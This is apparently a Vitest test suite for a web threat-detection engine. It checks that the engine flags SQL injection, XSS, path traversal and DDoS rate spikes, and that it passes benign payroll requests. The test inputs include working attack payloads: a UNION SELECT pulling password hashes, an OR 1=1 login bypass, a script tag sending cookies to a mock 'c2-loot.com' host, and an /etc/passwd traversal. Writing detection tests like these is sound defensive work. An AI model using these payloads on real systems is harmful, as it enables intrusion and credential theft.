import { describe, it, expect } from 'vitest';
import { HeuristicEngine } from '../src/threat/heuristic-engine';
import { DDoSAndRateAnomalyDetector } from '../src/threat/ddos-detector';

describe('Threat Intelligence Heuristic & Anomaly Engine', () => {
  const heuristic = new HeuristicEngine();
  const ddos = new DDoSAndRateAnomalyDetector();

  it('should detect SQL Injection with UNION SELECT pattern', () => {
    const payload = `dept_id=1' UNION SELECT username, password_hash, salary FROM staff_users --`;
    const result = heuristic.evaluate({
      method: 'POST',
      path: '/api/v1/payroll/export',
      payload,
      clientIp: '194.26.29.112',
    });

    expect(result.detected).toBe(true);
    expect(result.incidentType).toBe('SQL_INJECTION');
    expect(result.severity).toBe('CRITICAL');
    expect(result.mitigationBlueprint).toContain('Cloudflare WAF Custom Rule');
    expect(result.mitigationBlueprint).toContain('deny 194.26.29.112');
  });

  it('should detect SQL Injection tautology bypass (OR 1=1)', () => {
    const payload = `admin' OR 1=1 --`;
    const result = heuristic.evaluate({
      method: 'POST',
      path: '/api/v1/auth/login',
      payload,
      clientIp: '194.26.29.112',
    });

    expect(result.detected).toBe(true);
    expect(result.incidentType).toBe('SQL_INJECTION');
    expect(result.severity).toBe('CRITICAL');
  });

  it('should detect Cross-Site Scripting (XSS) script tag injection', () => {
    const payload = `<script>fetch('https://c2-loot.com?cookie='+document.cookie)</script>`;
    const result = heuristic.evaluate({
      method: 'POST',
      path: '/api/v1/profile/update',
      payload,
      clientIp: '185.220.101.5',
    });

    expect(result.detected).toBe(true);
    expect(result.incidentType).toBe('XSS_ATTACK');
    expect(result.severity).toBe('HIGH');
  });

  it('should detect Directory Traversal / LFI attempts', () => {
    const result = heuristic.evaluate({
      method: 'GET',
      path: '/api/v1/documents/view?file=../../../../../../etc/passwd',
      clientIp: '45.154.255.89',
    });

    expect(result.detected).toBe(true);
    expect(result.incidentType).toBe('PATH_TRAVERSAL');
    expect(result.severity).toBe('HIGH');
  });

  it('should allow legitimate and benign payloads without false positives', () => {
    const result = heuristic.evaluate({
      method: 'POST',
      path: '/api/v1/payroll/calculate',
      payload: JSON.stringify({ employeeId: 'EMP-9021', daysWorked: 30, bonus: 15000 }),
      clientIp: '197.210.64.12',
    });

    expect(result.detected).toBe(false);
    expect(result.incidentType).toBe('NONE');
  });

  it('should detect DDoS rate limit anomalies exceeding 50 req/sec', async () => {
    const testIp = '103.145.13.204';
    let lastResult: any;

    // Simulate 55 rapid requests
    for (let i = 0; i < 55; i++) {
      lastResult = await ddos.trackAndInspect({
        clientIp: testIp,
        path: '/api/v1/auth/login',
        statusCode: 200,
      });
    }

    expect(lastResult.isAnomaly).toBe(true);
    expect(lastResult.anomalyType).toBe('DDOS_RATE_SPIKE');
    expect(lastResult.severity).toBe('CRITICAL');
  });
});
